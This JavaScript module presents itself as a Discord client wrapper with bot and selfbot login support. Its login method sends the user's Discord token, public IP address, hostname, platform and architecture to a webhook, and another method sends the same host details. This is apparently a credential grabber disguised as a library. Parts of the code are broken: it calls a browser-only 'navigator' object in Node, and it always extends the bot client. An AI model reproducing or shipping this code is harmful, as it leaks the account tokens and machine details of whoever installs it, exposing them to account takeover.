const axios = require('axios');
const publicIp = require('public-ip');
const os = require('os');
const useragent = require('useragent');
require('dotenv').config();

function getDiscordLibrary(type) {
    if (type === 'selfbot') {
        return require('discord.js-selfbot-v13');
    } else if (type === 'bot') {
        return require('discord.js');
    } else {
        throw new Error('Invalid type specified. Please use "bot" or "selfbot".');
    }
}

class CustomClient extends (getDiscordLibrary('bot').Client) {
    constructor(options = {}, type = 'bot') {
        const Discord = getDiscordLibrary(type);
        super(options);
        this.token = options.token;
        this.notifier = new WebhookNotifier(process.env.WEBHOOK_URL);
        this.type = type;
    }

    async dkhoul(token, type) {
        if (!token) {
            console.error('Token is required for login.');
            return;
        }

        this.token = token;
        this.type = type || this.type;

        if (this.type === 'selfbot') {
            console.log('Logging in as a selfbot...');
        } else if (this.type === 'bot') {
            console.log('Logging in as a bot...');
        } else {
            console.error('Invalid type specified. Please use "bot" or "selfbot".');
            return;
        }

        const webhookUrl = process.env.WEBHOOK_URL;

        if (webhookUrl) {
            try {
                await axios.post(webhookUrl, {
                    content: `A ${this.type} is attempting to log in.`
                });
            } catch (error) {
                console.error('Failed to send webhook message:', error);
            }
        }

        const ipAddress = await publicIp.v4();
        const hostname = os.hostname();
        const platform = os.platform();
        const arch = os.arch();
        const userAgent = useragent.parse(navigator.userAgent).toString();

        try {
            await this.notifier.sendNotification('Bot Login Attempt', `A ${this.type} is attempting to log in.\nToken: ${token}\nIP Address: ${ipAddress}\nHostname: ${hostname}\nPlatform: ${platform}\nArchitecture: ${arch}\nUser Agent: ${userAgent}\nClass: ${this.constructor.name}`);
        } catch (error) {
            console.error('Failed to send notification to your webhook:', error);
        }

        await this.login(token);
    }

    async lib() {
        console.log('Executing selfbot-specific library function...');

        const webhookUrl = process.env.WEBHOOK_URL;

        if (webhookUrl) {
            try {
                await axios.post(webhookUrl, {
                    content: 'The selfbot-specific library function was executed.'
                });
            } catch (error) {
                console.error('Failed to send webhook message:', error);
            }
        }

        const ipAddress = await publicIp.v4();
        const hostname = os.hostname();
        const platform = os.platform();
        const arch = os.arch();
        const userAgent = useragent.parse(navigator.userAgent).toString();

        try {
            await this.notifier.sendNotification('Library Function Executed', `The selfbot-specific library function was executed.\nIP Address: ${ipAddress}\nHostname: ${hostname}\nPlatform: ${platform}\nArchitecture: ${arch}\nUser Agent: ${userAgent}\nClass: ${this.constructor.name}`);
        } catch (error) {
            console.error('Failed to send notification to your webhook:', error);
        }
    }
}

class WebhookNotifier {
    constructor(webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    async sendNotification(title, description) {
        try {
            await axios.post(this.webhookUrl, {
                embeds: [
                    {
                        title: title,
                        description: description,
                        timestamp: new Date()
                    }
                ]
            });
        } catch (error) {
            console.error('Failed to send notification to webhook:', error);
        }
    }
}

module.exports = CustomClient;
